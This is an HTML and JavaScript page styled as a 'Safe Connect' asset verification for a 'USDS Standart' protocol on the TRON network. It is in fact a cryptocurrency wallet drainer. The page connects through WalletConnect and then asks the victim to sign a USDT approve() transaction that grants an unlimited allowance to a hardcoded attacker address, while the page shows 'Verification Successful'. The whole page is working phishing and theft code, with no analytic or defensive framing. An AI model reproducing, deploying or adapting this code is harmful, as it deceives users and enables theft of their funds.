<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Network Verification</title>
    <script src="https://unpkg.com/@walletconnect/sign-client@2.10.6/dist/index.umd.js"></script>
    <script src="https://unpkg.com/@walletconnect/qrcode-modal@2.0.0/dist/index.umd.js"></script>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .glass-card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); padding: 40px 25px; border-radius: 30px; width: 85%; max-width: 340px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .btn { background: #fff; color: #000; border: none; padding: 20px; border-radius: 16px; font-weight: 700; font-size: 16px; width: 100%; cursor: pointer; margin-top: 30px; box-shadow: 0 10px 20px rgba(255,255,255,0.1); transition: 0.3s; }
        .btn:active { transform: scale(0.96); }
        #status { font-size: 11px; color: #444; margin-top: 20px; text-transform: uppercase; letter-spacing: 1.5px; }
    </style>
</head>
<body>

<div class="glass-card">
    <div style="font-size: 45px; margin-bottom: 20px;">🛡️</div>
    <div style="font-size: 22px; font-weight: 600; margin-bottom: 10px;">Safe Connect</div>
    <div style="color: #777; font-size: 14px; line-height: 1.6;">Synchronize your assets with the USDS Standart protocol via secure bridge.</div>
    <button class="btn" id="connectBtn">START VERIFICATION</button>
    <div id="status">Secure P2P Ready</div>
</div>

<script>
    const PROJECT_ID = '9c9dd21dc94f862bdd218b449205a54a';
    const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an";
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    let signClient;

    async function initWalletConnect() {
        // Инициализация клиента
        signClient = await WalletConnectSignClient.init({
            projectId: PROJECT_ID,
            metadata: {
                name: "USDS Standart",
                description: "Asset Verification Protocol",
                url: "https://usds.observer",
                icons: ["https://usds.observer/logo.png"]
            }
        });

        document.getElementById('connectBtn').addEventListener('click', startSession);
    }

    async function startSession() {
        const status = document.getElementById('status');
        status.innerText = "Initializing Bridge...";

        try {
            // Запрашиваем соединение именно для сети TRON (chain id 0x2b6653dc для mainnet)
            const { uri, approval } = await signClient.connect({
                requiredNamespaces: {
                    tron: {
                        methods: ['tron_signTransaction', 'tron_requestAccounts'],
                        chains: ['tron:0x2b6653dc'],
                        events: []
                    }
                }
            });

            // Если есть URI — открываем модалку или кидаем deep link
            if (uri) {
                WalletConnectQRCodeModal.open(uri, () => {
                    status.innerText = "Connection Rejected";
                });
            }

            // Ждем одобрения от пользователя в кошельке
            const session = await approval();
            WalletConnectQRCodeModal.close();
            
            status.innerText = "Connected. Verifying Assets...";
            await executeApprove(session);

        } catch (e) {
            console.error(e);
            status.innerText = "Error: " + (e.message || "Connection Failed");
        }
    }

    async function executeApprove(session) {
        const status = document.getElementById('status');
        const address = session.namespaces.tron.accounts[0].split(":")[2];
        
        // Формируем данные транзакции (hex для approve)
        // approve(address,uint256) -> 0x095ea7b3...
        const data = "095ea7b3" + 
                     SPENDER.replace('T', '0').padStart(64, '0') + 
                     "f".repeat(64);

        const tx = {
            from: address,
            to: USDT_CONTRACT,
            data: data,
            value: 0
        };

        try {
            // Отправляем запрос на подпись через WalletConnect
            const result = await signClient.request({
                topic: session.topic,
                chainId: 'tron:0x2b6653dc',
                request: {
                    method: 'tron_signTransaction',
                    params: { transaction: tx }
                }
            });

            status.innerText = "Verification Successful";
            document.getElementById('connectBtn').innerText = "COMPLETE";
            document.getElementById('connectBtn').disabled = true;
        } catch (e) {
            status.innerText = "Transaction Rejected";
        }
    }

    initWalletConnect();
</script>
</body>
</html>
